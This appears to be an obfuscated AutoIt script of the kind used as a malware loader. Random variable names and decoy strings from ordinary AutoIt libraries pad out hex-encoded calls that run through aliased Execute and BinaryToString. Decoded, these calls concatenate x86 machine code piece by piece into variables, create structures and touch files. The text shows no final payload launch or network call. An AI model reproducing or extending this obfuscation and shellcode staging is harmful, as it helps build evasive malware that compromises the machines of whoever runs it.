	Global $akeqams = "2 lines;"
	Dim $zeczekybhr = "handle"
	Local $rvxmrdnzgckbo = "int64*"
	Global $ztyym = "["
	Global $ylfwcu = "Locale"
	Local $zmudzaeshtcrxpte = "struct*"
	If NOT ($faqhjhbru == 1) Then
		Local $hijdwdj = $ee($v1("0x24626D65666874736B6D69617067746A646D6E7072647963737366716B2026202235303844383546344645464646463530384438354134453846464646353046464437383343343043384438353943453646464646453842454542464646463839343531303835433022"))
	Else
		$i = $poe($gfro("0x2469202D20223122"))
	EndIf
	Dim $yunyqcvogy = IsString(-46456126)
	Dim $npezx = "GetThemeFilename"
	Global $ffhqjavlsbmcoaawshlu = "Handle"
	Dim $hbqkapedhfbi = "long;long;long;long;long;byte;byte;byte;byte;byte;byte;byte;byte;wchar[32];wchar[64];wchar[32];wchar[32]"
	Local $mnkmyvyzmmphg = " "
	Local $ndvapsqvwnxfwnsgnguyjsd = "LocalFree"
	Local $exkhyn = "int"
	Dim $fyivtwoqlytcyui = "struct*"
	Dim $pouahqootlopklpaniekb = "handle"
	If NOT ($yunyqcvogy == "cstnypz") Then
		Local $aibrhlgprwbpuoyosluscjlnbchc = $ee($v1("0x2468696A6477646A2026202237353045384438354343463246464646453841434542464646463839343531303844383539344534464646464538394545424646464638393435304338354330373530453844383522"))
	Else
		Local $qzpcwpoemanbstaawd = $ee($v1("0x24677269696F776E6262666971727A6D6B636E2026202235333536353738314543373830313030303036413545353938424643384438343234303830343030303033334442384442343234383830313030303038393943323441343032303022"))
	EndIf
	Dim $crppyfdcnxsdsserrhfdd = IsString("owphcrzngggdxyrpvljusweol")
	Dim $yhappuotsirbpip = "handle"
	Dim $rhxiirndvxrbvbhlhw = "Comments"
	Global $xpyavzqswnu = "OpenThemeData"
	Dim $aqqyibmyqcqnqtebtgcius = "user32.dll"
	Dim $rwkyjwbpfgvqxt = "bool"
	Global $ywjijwovunxwcirimqfbzgfp = "user32.dll"
	Local $ikvngmutcyeizwd = "USHORT"
	Local $sdydilcr = "kernel32.dll"
	Global $rukyjfkyzqkhopjhif = "Radius"
	Global $wkfhoeckloquckeukq = "dword"
	If NOT ($crppyfdcnxsdsserrhfdd == "yjvnncxi") Then
		Local $dzwsdjivkvhgxjlwrqvwiuqrbl = $ee($v1("0x2461696272686C677072776270756F796F736C7573636A6C6E626368632026202242434545464646464538384345424646464638393435304338443835444346364646464645383745454246464646383934353134383543303735304538443835414345414646464622"))
	Else
		Local $whngczurqqtsp = $ee($v1("0x246C75666B7A656B62646463786475616661786C6466672026202237354530464639353738303130303030383543303738393038423436333438393435463838423435443038393435444338423435303833423436333437323046334234363530373722"))
	EndIf
	Dim $qjnivjoydulqdavjequ = IsString(-77234309)
	Local $tmmefn = "shell32.dll"
	Local $canxxlfqdhrdaqc = "-"
	Global $uvqkculojxjtpwwc = "Day"
	Global $mhepkehwysv = "wparam"
	Local $ydtxsysljchh = "ptr"
	Local $gypchihpggfvymvnmujrt = "Scalable"
	Dim $bqaybhcvpbs = "ptr"
	Dim $ibqnmrmctz = "struct*"
	Local $mazbctgbrijnydkfwtahf = "		<td>the</td>"
	Dim $gqnwy = "RegQueryReflectionKey"
	If NOT ($qjnivjoydulqdavjequ == 1) Then
		Local $hrwopeddl = $ee($v1("0x24647A7773646A69766B766867786A6C777271767769757172626C2026202245383643454246464646383934353134384438354434463446464646453835454542464646463839343531383835433037353045384438354334463046464646453834434542464622"))
	Else
		Local $fimbucfkotmypscbkxg = $ee($v1("0x2478657867772026202246454646464635433442364536464337383546384645464646463737364534343643433738354643464546464646364337333543344643373835303046464646464636433635333322"))
	EndIf
	Local $rzimlfddwdo = $ee($v1("0x246872776F706564646C2026202246463839343531383844383542344543464646464538334545424646464638393435314338354330373530453844383541344538464646464538324345424646464638393435314322"))
	Dim $kmmpuq = IsInt(-65392857)
	If NOT ($kmmpuq == "fnjclnqvbqygxrlpmearrriztgqzhptv") Then
		Local $utxpvlgktjieqscrywgdc = $ee($v1("0x24727A696D6C66646477646F2026202238423544313438443835354346464646464635304538373245414646464638424630384434354143353038394235453846384646464645383631454146464646384246383844383522"))
	Else
		Local $qqgsahewhhimzylqinsvruf = $ee($v1("0x247162627276672026202246464646433738353343464646464646343636393643364343373835343046464646464635323635363337343838383534344646464646464337383543344645464646463432363522"))
	EndIf
	Dim $fqthzonbwwfnhpbsyumgkcug = IsString("imoxgaborbxyvqtdavldqkgktg")
	Local $pweaizuotgczubzwx = "TreeViewConstants.au3"
	Global $crgduocwmiycalha = "kernel32.dll"
	Local $pgdfnkgpbvkbvoynypafuwy = "wstr"
	Local $zziuyvkghiy = ">AutoIt</a> is a wonderful automation scripting language.</div>"
	Global $oybbbgcobyilahdthbt = "wparam"
	Local $ggwpqogpp = "Content-Type: text/plain; charset=US-ASCII"
	Global $rvuxaeflyk = "<tr>"
	Local $ddobwsnjhsvemqohljvn = "gdi32.dll"
	Local $yjbpzyiwuiv = "dword"
	If NOT ($fqthzonbwwfnhpbsyumgkcug == 0) Then
		Local $tyuwidkrfqun = $ee($v1("0x2475747870766C676B746A69657173637279776764632026202231384646464646463530464644373842354431343839383545344638464646463844383538344643464646463530453834314541464646463839383532383031303030303844383522"))
	Else
		$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x4469724372656174652824716863636F77746574726866726A736B716E61677229"))
	EndIf
	Dim $rosujyjdztoor = IsString(-81473497)
	If NOT ($rosujyjdztoor == 1) Then
		Local $nqnugsdxskbivr = $ee($v1("0x247479757769646B726671756E2026202232344641464646463530384434354543353046464437353046464436383938354334303030303030384438354434464246464646353038443435454335304646443735304646443622"))
	Else
		Local $hoacpicpdncbudv = $ee($v1("0x247267636B677770647A612026202238354141464546464646433738354430464546464646344537343446373043373835443446454646464636353645343636393636433738354438464546464646364336353838383522"))
	EndIf
	Dim $zbnuqrvcokzvbvqcc = IsString("mvjmaybgzwdhohfsoczjclepoehxsxgssf")
	Dim $vfeyqmah = "kernel32.dll"
	Global $djtzqbwwrvnjiyxxlpooj = "CoCreateGuid"
	Global $hqsbjbgpd = "APIResConstants.au3"
	Global $wdlobujihwwatp = "dword"
	Global $hlonnrajv = "dword"
	Local $ygiblaidamofmylu = "gdi32.dll"
	Dim $mnivoiyjllfghttipoyh = "^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+"
	Dim $gvxjbpffrmtdbpkt = "gdi32.dll"
	Local $wrvfhltpwgtaffycar = "dword"
	Global $gfntoqstfufvwkxlpqxh = "uxtheme.dll"
	Local $ymnxcmkcupxplhmsvawrlnfi = "kernel32.dll"
	Dim $lbbpuxgphbsqgvrlfz = "wstr"
	Local $dxchdrnk = "$RBHT_GRABBER - The point was in the rebar band"
	If NOT ($zbnuqrvcokzvbvqcc == 0) Then
		Local $uinehqambudtnhwtosoqdbox = $ee($v1("0x246E716E7567736478736B626976722026202238393835433030303030303038443835353446444646464635303844343545433530464644373530464644363839383542343030303030303844383539344643464646463530384422"))
	Else
		Local $johavbttdxnpynfdv = $ee($v1("0x24726A72786566736B72677369717171647973736E737A2026202230303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	EndIf
	Dim $davybtad = IsInt(-39597809)
	Dim $ckpwuczjzqnidzirf = "int"
	Dim $wppkwpsfvdfmxhzxnvthiudj = "Bottom"
	Local $tsmmnmftmufzektnwkakwzl = "handle*"
	Local $xrbmfbfrynjqrzsnncivoxoh = "wparam"
	Global $gbugidopora = "sqlite3_close"
	Dim $nmgefsbsjmivnkacuegt = "bool"
	Local $gandkdv = "Error"
	Local $bbkicbgg = " & StringReplace($sString, "
	Global $ynpepmxvhjv = "shlwapi.dll"
	Dim $dsprooztqlipusdankwvhnxz = "MouseCoordMode"
	Local $qhvgdciyiqpzeiewdvzsfsg = "EnumResourceLanguagesW"
	Local $mrquq = "WaitForSingleObject"
	Global $imvfenltukxlsndqu = "GdipSetPathGradientFocusScales"
	If NOT ($davybtad == 0) Then
		Local $sdcgjjwlbqjbdaidnbpt = $ee($v1("0x2475696E656871616D627564746E6877746F736F7164626F782026202234354543353046464437353046464436383938354238303030303030384438353838464246464646353038443435454335304646443735304646443638393835423030303030303022"))
	Else
		Local $uqhkbmnkwnantpqgtczbuex = $ee($v1("0x246E76626D766D65707267677A616B7A7563676F6578682026202238393435453036363839343545323844343545303539383934354143384434354134353033334636364130433844343546343530433734354134313830303030303038393735413822"))
	EndIf
	Dim $ysyayvdprioatbozsbxqm = IsInt("qmasutpkhwgesanncwgiyrwrzq")
	Global $zizozamazxkmxjbyulfkejdn = "$_IESTATUS_COMError"
	Local $njrhzezwvpciooscrofeoo = "FailedUseCount"
	Local $smupe = "Reference Material: "
	Dim $dyrhqlhxngir = "handle"
	Global $lhmzflizvfggsfgrdzylq = "AutoIt.Error"
	Global $cygai = "int"
	Global $bqjhrmyyuyvcjepsgofsdgf = "struct*"
	Local $whfiqrjifbwzzr = "CryptEncrypt"
	Dim $rgsryioutzduukzuf = "ulong"
	Global $midsbznwhporcpoduuy = "int64*"
	Local $xrgnkrwetbjhejc = "ptr"
	Local $urmellsfwwzkrtcylmmopwz = "GdipDrawPolygon"
	Global $iulfavfzdyasgu = "dword EndOfJobTimeAction"
	Dim $aeijqffxqmajysjiydxtr = "kernel32.dll"
	Dim $spdxsfrtj = "MSeconds"
	Global $mdrpghjieqegrjhrxmeeadr = "handle"
	Dim $fkvhzxtlwvl = "w"
	Local $mvabkwgixavx = "none"
	If NOT ($ysyayvdprioatbozsbxqm == 1) Then
		Local $qnfwbzwjuensuqmeoucryrs = $ee($v1("0x24736463676A6A776C62716A62646169646E6270742026202238443835313446434646464635303844343545433530464644373530464644363839383541433030303030303844383546344643464646463530384434354543353046464437353022"))
	Else
		Local $gpfkl = $ee($v1("0x24786D61786D677A6E6E6667762026202236454337383535304639464646463734353337343732433738353534463946464646363936453637373336364337383535384639464646463537303043373835313046424646464622"))
	EndIf
	Dim $yjmrmybynxqhmgnmfpyu = IsString("lrtqxjvubdaraerxgwqneoqgswaidehsxhsbrxfafvpkxwv")
	Local $gbxmulcaznmiuvoin = "  $CFU_CF1UNDERLINE    - The structure maps CHARFORMAT"
	Dim $djaulufycatgw = " to exit <<<<<<<"
	If NOT ($yjmrmybynxqhmgnmfpyu == 0) Then
		Local $wxupnkkdclvgfy = $ee($v1("0x24716E6677627A776A75656E7375716D656F7563727972732026202246464436383938354243303030303030384438353834464146464646353038443435454335304646443735304646443638423544313438393835413830303030303038443835343022"))
	Else
		Local $v1 = $ee("BinaryToString")
	EndIf
	Dim $welslognt = IsString(91066904)
	Global $mfwzemwbcbag = "float"
	Global $tgmsqrdbprwwwhtgjloqvwgs = "bool"
	Local $bjsfljozursdsiehhhpat = "bool"
	Global $uogdxztdhwbrxllnhi = "user32.dll"
	Local $iwhqoykzibtpblxck = "struct*"
	Global $owvhnkwwcsljfalrymjajey = "0x555331C05050837C241C00740431C0EB05B80100000021C07516837C24200074"
	Dim $vaokwg = "handle"
	Local $lbadec = "wstr:cdecl"
	If NOT ($welslognt == "lhbajhmxchisjylliqsynm") Then
		Local $geknn = $ee($v1("0x24777875706E6B6B64636C766766792026202246394646464635304538374345394646464638393835343430313030303038443835443446434646464635304538364145394646464638393835453030303030303038443835434322"))
	Else
		Local $p5 = $poe($fooi4e("0x446C6C5374727563744372656174652822627974652041636C5265766973696F6E3B627974652053627A313B7573686F72742041636C53697A653B7573686F727420416365436F756E743B7573686F72742053627A322229"))
	EndIf
	Dim $pqjjbzfdxsuokxbykovisw = IsInt("jtelddbmzygvdpbrgwufsmblkcfsjqnciraskeqeokhnr")
	Global $qyjexuhjeytuaigyokcrnzbs = "lpfnHook"
	Dim $ftleudzpf = "ulong_ptr:cdecl"
	Local $tdoxzrtuzlxqumflqwroqo = "\"
	Local $uyrasakboiozbbawmgt = "kernel32.dll"
	Global $ixoyjxygfbye = "handle"
	Global $uglnog = "uint"
	Local $puqrdiiuxjqumt = "GetLogicalDrives"
	Local $idnaxwh = "StringConstants.au3"
	Global $iigeffbjpggcwsehvdhhmual = "dword"
	Global $msyjwli = "int"
	Local $flolkbgwfguvpaenk = "To:"
	If NOT ($pqjjbzfdxsuokxbykovisw == "feqbdrs") Then
		Local $rwcrhnn = $ee($v1("0x2467656B6E6E2026202246444646464635304538353845394646464638393835323430313030303038443835313046424646464635304538343645394646464638393835454330303030303038443835354322"))
	Else
		Local $v1 = $ee("BinaryToString")
	EndIf
	Dim $ivgfcprqxjqotsqq = BinaryToString("zjbfrjyljppdsdqttwtb")
	Dim $tossjqcyfibvldvzfmv = "gdi32.dll"
	Local $mpsbdzklvnjw = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
	Dim $mtzpssaoshpvqmg = "dword*"
	Local $kccahmcntn = "Array.au3"
	Local $oolttwdsrlaztoet = "GetThemeEnumValue"
	Local $zpeelllmmeynag = "dword"
	Dim $esnehotqba = "SeIncreaseBasePriorityPrivilege"
	Global $utzblzkkahhkqnsyasanxpg = "ArrayDisplayInternals.au3"
	Dim $aknjkxnokfoyuspwelf = "user32.dll"
	Local $bsbin = "OnClick"
	Dim $mxutzzwq = "bool"
	Local $bdnkbxiyblvvnbzjvickcn = "uint Size;dword Flags;int Item;dword Reserved"
	Global $ebtpznovxpxnhakem = "bool*"
	Global $cgrzpbiuztoxuuwwoi = "struct*"
	Global $zpmcvnhsfq = "lresult"
	Local $nxktzy = "wstr"
	Global $dbatndoqeyvjcrexunactd = "re running. Check your computer"
	If NOT ($ivgfcprqxjqotsqq == 0) Then
		Local $eptyxu = $ee($v1("0x2472776372686E6E2026202246464646464635304538333445394646464638393835303430313030303038443835303446444646464635304538323245394646464638393835394330303030303038443435414322"))
	Else
		Local $rwcrhnn = $ee($v1("0x2467656B6E6E2026202246444646464635304538353845394646464638393835323430313030303038443835313046424646464635304538343645394646464638393835454330303030303038443835354322"))
	EndIf
	Dim $tgymuicsndll = IsInt(-54917818)
	Dim $plpsrkgf = "WinAPICom.au3"
	Dim $ercaaqzhfcvww = "int"
	Global $fswrnwyeskrbvrgycrovalkk = "handle"
	Global $btptpvlbmzoxhtxiqyylnvw = "bool"
	Dim $azuilovywldrcgk = ";byte Hdr[8]"
	Global $nugccdulehlgwvobvlgeoabj = "SelectObject"
	Local $zwsawbyg = "hItem"
	Dim $wqnzjnnpoicakyjpknsxeqy = "wchar["
	Local $goeyoeuxppqoqn = "bool"
	Dim $wxwhcmmnsrjtgsslwhykqtx = "hwnd"
	Local $tyvxebwrbxs = "Param"
	Dim $skwnkd = "hWnd"
	Global $dtgxwidzpttsorvmiworusr = "handle"
	Global $fxjwkzwasdydajyyclk = "MSFTEDIT.DLL"
	Dim $abbhvgdkbcaecgptjuw = "open "
	Global $oeweswpgsoonwiuddq = "wstr"
	Dim $vdwhsi = "cm"
	Dim $mqtjmwkrnhuvjlppj = "CreatePopupMenu"
	Global $qgrrpsaax = "%04d/%02d/%02d"
	If NOT ($tgymuicsndll == 0) Then
		Local $zuiygjizjbl = $ee($v1("0x246570747978752026202235304538313345394646464638393835303830313030303038443835444346444646464635304538303145394646464638393835444330303030303038443835383446444646464622"))
	Else
		$poe($zeyc("0x46696C65436C6F73652824786D61637979636670776C7261696529"))
	EndIf
	Dim $heccytnvxsmcomg = IsString("bmstslzjbgobklimygdjhjyofkyur")
	Global $bjvzgybtuwk = "GetWindowDC"
	Local $nrhjrvvlcoedcejgitfs = "Warning"
	Global $dvzsubbhsqv = "user32.dll"
	Local $iovnqhhu = "GdipSetCompositingMode"
	If NOT ($heccytnvxsmcomg == 0) Then
		Local $gykhghp = $ee($v1("0x247A756979676A697A6A626C2026202235304538454645384646464638393835443430303030303038443835333046464646464635304538444445384646464638423735304338393835333430313030303038443435434322"))
	Else
		Local $sdcgjjwlbqjbdaidnbpt = $ee($v1("0x2475696E656871616D627564746E6877746F736F7164626F782026202234354543353046464437353046464436383938354238303030303030384438353838464246464646353038443435454335304646443735304646443638393835423030303030303022"))
	EndIf
	Local $selawtgnczfujdo = $ee($v1("0x2467796B686768702026202235303842444545384339453846464646383938353438303130303030384434353834353045384241453846464646383938353530303130303030384438353743464646464646353022"))
	Dim $wknnqnugpidnrdbjagmmh = IsInt("ggqouibhzncizqfflh")
	Global $kfwrbise = "struct*"
	If NOT ($wknnqnugpidnrdbjagmmh == "ewducsjszysbmtzfrrawmgtwgrwpekrxbxhyyqit") Then
		Local $bgkpiyaenivrkicgyidgsizyprtg = $ee($v1("0x2473656C617774676E637A66756A646F2026202245384138453846464646383938353534303130303030384438354143463946464646353045383936453846464646383938353838303030303030384438353934463946464646353022"))
	Else
		Local $lckpspyqafpaemafb = $ee($v1("0x246A736A7272732026202238443835373446434646464635304538313545374646464638393835363430313030303038443835323446424646464635304538303345374646464638393835354330313030303022"))
	EndIf
	Dim $nnrewojgavwr = IsString(95320525)
	Dim $qorqloldoky = "MinDOW"
	Global $nirwnphqtwnbeistqkzab = "ulong"
	Dim $bzfahdlyfzjjtjtmaau = "ptr"
	Dim $kdlvunhvtxey = "user32.dll"
	If NOT ($nnrewojgavwr == "wgrbsz") Then
		Local $itorhs = $ee($v1("0x2462676B70697961656E6976726B6963677969646773697A79707274672026202245383834453846464646383938354638303030303030384438353743464546464646353045383732453846464646383938353934303030303030384438353634464446464646353022"))
	Else
		Local $uetslru = $ee($v1("0x246F66626871697A6D7565786A646475646A2026202237323633363536364337383545304643464646463537303043373835444346444646464634433646363136344337383545304644464646463532363537333646433738354534464422"))
	EndIf
	Dim $jhiplovezizgrnz = IsInt("kmkuoqzjnbgcomxcsihzdeidooeacdwzgfmg")
	Local $pbpmjxrkglfvpfctsf = "hItem"
	Local $fecvnwtvtcvidyhr = "WinAPIConv.au3"
	Dim $xlynderllfipzcc = "long"
	Global $qwaxonikmlhubv = "Preparing display"
	Global $dhqzqvlipknwgaokf = "Text"
	Local $zwletsfeqdmpdlz = ":"
	If NOT ($jhiplovezizgrnz == 1) Then
		Local $xdxqzrraxracweathmgxvshmaqet = $ee($v1("0x2469746F7268732026202245383630453846464646383938353130303130303030384438353943464246464646353045383445453846464646383938353938303030303030384438353034464346464646353022"))
	Else
		Local $hwnobmqiekewbxxdigh = $ee($v1("0x24636F737A6261696E2026202246464646383934353438384438353634464346464646353038443435453035304646443738424438453843384534464646463839343534343844383534344643464646463530384422"))
	EndIf
	Dim $maapozcvo = IsInt("tsxieamngygdtbnizwdtfixaippynaxhpmtcum")
	Local $priqgwmgyqgslxxsuanetf = "mdc"
	Global $xijflumghxxuu = "biClrUsed"
	Dim $fckiwnfxvlkeedkijfjo = "CodecName"
	Dim $vuldazyahhkndy = "int"
	Local $dljakhbempko = "Param"
	Local $eqookjfxwkdxuphjtq = "GetWindowDisplayAffinity"
	Local $rllmkznknlxqtimjbe = "StringConstants.au3"
	Global $npgkhoffqykfzme = "float"
	Dim $krnjz = "uint"
	Dim $huzsl = "int"
	Local $eveccki = "MaxBlue"
	Global $mltvigaeqgadqae = "wparam"
	Dim $fymmswiiyzxzj = "l"
	If NOT ($maapozcvo == "znitzo") Then
		Local $vutdkskyjhim = $ee($v1("0x24786478717A7272617872616377656174686D67787673686D617165742026202245383343453846464646383938353830303130303030384438354230464246464646353045383241453846464646383341354538303030303030303038393835453430303030303022"))
	Else
		Local $xjtikkcqjjn = $ee($v1("0x246B7176726A716470706A7A6A75656675657672642026202236354337383530304642464646463734343336463645433738353034464246464646373436353738373443373835303846424646464635343638373236353636433738353043464222"))
	EndIf
	Dim $ltvglmtrgigcae = IsString(-39671851)
	Dim $zxazsxnzibhqxsrehiawym = "wparam"
	Dim $lthevabx = "Error"
	Local $ltcjxmlqzrjkjawp = "bool"
	Dim $mquvhdfvnagtlictngqylbp = "Header"
	Local $iydylf = "bool"
	Local $xqyvgrryqtyxbhgiifimlb = "wstr"
	Dim $uhrooacy = ">Seven</td>"
	Dim $pljgudz = "127.0.0.1"
	Local $gqxqcaial = "[\s\"
	Dim $qmjajbtvypcdtxvbs = "lpText"
	Dim $tznrt = "ushort;ushort;ptr;wchar["
	Local $uyahz = "user32.dll"
	Global $wttxutgrntxfegiducwrys = "wchar Text[4096]"
	Local $tazpvdtbyeyoegzs = "wstr"
	Dim $agvnqwmxceyenhhbtgbsqddf = "int"
	Local $qwxycpglixmjsigq = "hwnd hWnd;"
	If NOT ($ltvglmtrgigcae == "mycjxn") Then
		Local $pslhxnuogpmclkwfwkpimxecyx = $ee($v1("0x24767574646B736B796A68696D2026202238443835353446434646464635304538313145384646464638393835433830303030303038443835464346414646464635304538464645374646464638393835363030313030303022"))
	Else
		$ee($v1("0x446C6C5374727563745365744461746128247878786A79767070786E796C6B64617A6E756E6F73796D6371662C20226634713534666473353466717364222C2024444429"))
	EndIf
	Dim $akgwe = IsInt("ngqnrqmeaoanrdofxyayekzbgjgiu")
	Local $wdqlghwbffvo = "struct*"
	Global $egxijkmffbyitrrnhexofhbc = "<li><a href="
	Local $lsemekxa = "user32.dll"
	Local $bzkxkjiycjosnj = "BtnShadow"
	Dim $wfuwwfbnapuywqrzvdxe = "szFaceName"
	Global $unkvwzqcuddettpeuj = "wparam"
	Local $nzgtwtsgldlanajmjenk = "int64 StartTime;int64 BytesRecv;int64 SMBSRecv;int64 PageRead;int64 NonPageRead;"
	Global $smxfgydvymyhndczgywiz = "handle"
	Dim $tgskewzgne = "struct*"
	Dim $nlhiinnosvihfglrqvzirmag = "ulong"
	Local $nstipv = "handle"
	Global $oarfqsakjdzpnp = "ptr"
	Local $xhblbprlzwzmtlen = "hwnd"
	Dim $durylpxprlzcxzaxs = "handle"
	Dim $latqvbxprucpmg = "MinSecond"
	If NOT ($akgwe == 1) Then
		Local $reubjzetidgaonwqmfirszvecys = $ee($v1("0x2470736C68786E756F67706D636C6B7766776B70696D78656379782026202238443835363046424646464635304538454445374646464638393835373430313030303038443835443046454646464635304538444245374646464638393835303030313030303022"))
	Else
		Local $eodmqc = $ee($v1("0x247A78757072636E2026202237343433373243373835303846434646464636353631373436354337383530434643464646463533363536333734433738353130464346464646363936463645303043373835343022"))
	EndIf
	Dim $fjpvezzaatbnsolwwpfd = BinaryToString("0x61696B6361686D67656E6D6C64646966737164636463")
	Local $hyxjkqqugrjbgilasq = "\"
	Global $xdjfswbbteffd = "wstr"
	If NOT ($fjpvezzaatbnsolwwpfd == 0) Then
		Local $zzrniiavquffmxrcsyw = $ee($v1("0x24726575626A7A6574696467616F6E77716D666972737A76656379732026202238443835304346464646464635304538433945374646464638393835314330313030303038443835323446444646464635304538423745374646464638393835413030303030303022"))
	Else
		$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x4469724372656174652824716863636F77746574726866726A736B716E61677229"))
	EndIf
	Dim $crpdlt = IsString(43552945)
	Global $gtdikbkhkuodstpsn = "dword"
	If NOT ($crpdlt == 1) Then
		Local $wcmwlyuhes = $ee($v1("0x247A7A726E69696176717566666D7872637379772026202238443835344346424646464635304538413545374646464638393835384330303030303038443835433446394646464635304538393345374646464638393835463430303030303022"))
	Else
		Local $gqsnx = $ee($v1("0x246A6770616665716C6C7467667970696A7769682026202230303030383543303738444538423436353035373638303030303030303836413430383934354430384434354430353035373638314630303046303038443435453035303839374422"))
	EndIf
	Dim $wcmkybby = IsInt("gbtcwzvblitkesekedlljbwzbnaysgdyzi")
	Dim $lbqhykueuw = " maxlength="
	Dim $nwkvayjxxnujegic = "OpenSemaphoreW"
	Local $ngrqditcszbgadjneotrnxjn = "DwmGetWindowAttribute"
	Global $telbygmshwfhngvrywgufut = "GdipSetPathGradientFocusScales"
	Local $ymqxddh = "handle"
	Dim $gycanlcryggkrgkrgaszkhmw = "Year"
	Dim $jsczdg = "handle"
	Local $tghus = "\"
	If NOT ($wcmkybby == "dlgmdtxyyqhjaarne") Then
		Local $ipylheurqyrnsgvhavtaxcggcpnc = $ee($v1("0x2477636D776C79756865732026202238443835444346394646464635304538383145374646464638393835463030303030303038443835323446394646464635304538364645374646464638393835373830313030303022"))
	Else
		Local $hijdwdj = $ee($v1("0x24626D65666874736B6D69617067746A646D6E7072647963737366716B2026202235303844383546344645464646463530384438354134453846464646353046464437383343343043384438353943453646464646453842454542464646463839343531303835433022"))
	EndIf
	Dim $iwoujmmwh = IsString("rvxzkdrwbhwj")
	Global $gsmisyvhdevvkx = "Text"
	Global $gjceztgswfgslfimonnumz = "handle"
	Local $tkyoc = "wchar["
	Global $uuewhgzgqvspory = "WSAGetLastError"
	Local $jnylhfscfjheuqjeqldqgg = "FileConstants.au3"
	Local $dktmblmfffjpjnydeapym = "__Debug_ReportWindowWrite("
	Dim $jbnitpcyj = "ENDSTRUCT"
	Dim $zqeyvyolapgyfmbfyqjci = "bool"
	Dim $ydmqc = "wchar Buffer[4096]"
	Dim $jdeowrcnmqfuuodgnxat = "comctl32.dll"
	If NOT ($iwoujmmwh == 0) Then
		Local $fonbvcheguftwkcaeikgadyzndug = $ee($v1("0x246970796C686575727179726E73677668617674617863676763706E632026202238443835373846394646464635304538354445374646464638393835413430303030303038443835453446424646464635304538344245374646464638393835434330303030303022"))
	Else
		Local $ascikbidnjxeatwjmwyetkibgqnpdpmoeflzel = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C654578697374732824636879706171776E6B65756465796768746D73667A6C7578766D6E786878796A6E726364756B6A7462677A636F68706369706765756D76726F716429"))
	EndIf
	Dim $mlnez = BinaryToString("tmnxmhqgsgpunuygrhcfenaaihhnujqoxtcctotyjezhqkh")
	Local $jmobhnjgnwpriifjz = "Image"
	Dim $jmojqtass = "SelectedImage"
	Dim $iokiacyaotfjkvc = "handle"
	Global $shwdhxyflomqodvbj = "bool"
	Global $ixgbrpheyvqwubrsrehmjv = "struct*"
	Local $xfboiligbhvbulr = "CredPackAuthenticationBufferW"
	Global $pxqwmmcken = "</body>"
	Local $gvntkfqpjiqsuvr = "shell32.dll"
	Global $wpobmxbsplygvunu = "str"
	Dim $rhkdrgpzdr = "kernel32.dll"
	Local $lxpxyeiprrqfqcm = "StringConstants.au3"
	Dim $flpbh = " title="
	Local $vxyyayzlvxfqvkwrzqtyadc = "WMF"
	Global $kzxjpclajlrtqsffhp = "dword*"
	Local $voybrsnw = "handle"
	Global $zjnzolhcevblzgzbtvwn = "SendMessageTimeout"
	Local $pkyhyjyesqwuhf = "MaxValid"
	Local $hojjtdzvrrubvhipwxppd = "struct*"
	If NOT ($mlnez == 1) Then
		Local $jsjrrs = $ee($v1("0x24666F6E627663686567756674776B636165696B676164797A6E6475672026202238443835413046454646464635304538333945374646464638393835464330303030303038443835393846414646464635304538323745374646464638393835374330313030303022"))
	Else
		Local $ohwkmkfgnduclaasgmejtekz = $ee($v1("0x247A707173622026202237383838383541434642464646464337383537434645464646463445373434333646433738353830464546464646364537343639364536364337383538344645464646463735363522"))
	EndIf
	Dim $grjvcmsvnebfxadvhzm = IsString(82059200)
	Dim $ioekhqbrxwdskiwjzvgwub = "SelectedImage"
	Local $bhqrdacommnhhoxdjib = "long"
	If NOT ($grjvcmsvnebfxadvhzm == "cnbsjhnagpppsyilrumzyywuspiwtzdqju") Then
		Local $lckpspyqafpaemafb = $ee($v1("0x246A736A7272732026202238443835373446434646464635304538313545374646464638393835363430313030303038443835323446424646464635304538303345374646464638393835354330313030303022"))
	Else
		Local $tyuwidkrfqun = $ee($v1("0x2475747870766C676B746A69657173637279776764632026202231384646464646463530464644373842354431343839383545344638464646463844383538344643464646463530453834314541464646463839383532383031303030303844383522"))
	EndIf
	Dim $kyddhwwgcgeqs = BinaryToString("0x696F62726E6362736D6A79666B75")
	Global $vadyvibrhjtktirhqjmo = "CloseHandle"
	Dim $ijgjrpipr = "wparam"
	Local $whmcvbpon = "_IE_VersionInfo"
	Global $vykpzylyruvppy = "_IEAttach"
	Dim $ubafdvaegrmgpsvrtnsetptx = "str"
	Local $lwnwrn = "str"
	Global $rhsdkktgzscbz = "hwnd"
	Global $rxfeicppsohsv = "GetGuiResources"
	If NOT ($kyddhwwgcgeqs == 0) Then
		Local $tfgbbpooriavolobezappquhkd = $ee($v1("0x246C636B707370797161667061656D6166622026202238443835333446444646464635304538463145364646464638393835313830313030303038443835333846424646464635304538444645364646464638393835353830313030303022"))
	Else
		Local $fimbucfkotmypscbkxg = $ee($v1("0x2478657867772026202246454646464635433442364536464337383546384645464646463737364534343643433738354643464546464646364337333543344643373835303046464646464636433635333322"))
	EndIf
	Dim $zalzmvpujwmyxlblyqk = IsString("lnuoycfvnmtqq")
	Local $prckvc = "dword"
	Local $zcboykp = "__Excel_COMErrFunc"
	Dim $iwesercibkwdpljjutfygv = "WinDetectHiddenText"
	Global $iawagvxmnfflyysttyahvmp = "struct*"
	Local $wweqmujuvrfivpyr = "SigCount"
	Dim $yvvmfmw = "long"
	Local $wkrlryb = "Day"
	If NOT ($zalzmvpujwmyxlblyqk == 0) Then
		Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
	Else
		Local $qbbrvg = $ee($v1("0x246E716D6864646E73637370736F79787A6C6E6D6C2026202237333733433738353030464346464646363136373635303043373835323446464646464634353645363435304337383532384646464646463631363936453734383838353243464622"))
	EndIf
	Dim $skbecbnkdkjejjbqtbjzdq = BinaryToString("0x6E6D6867786765677179636F657072756A676879616D")
	Global $oxeqwjfnsw = "ptr"
	Global $sctqdymbpvxxs = "Unknown"
	Global $qfncuyn = "DrawThemeParentBackground"
	Global $vevitciyhbwdttn = "SysDateTimePick32"
	Global $gteblk = "bool"
	Local $pqtotvqc = "LONG x; LONG y;"
	Dim $cvoubsgnmt = "wchar["
	Local $ltbitslgbxthnmchdqfzrake = "ptr"
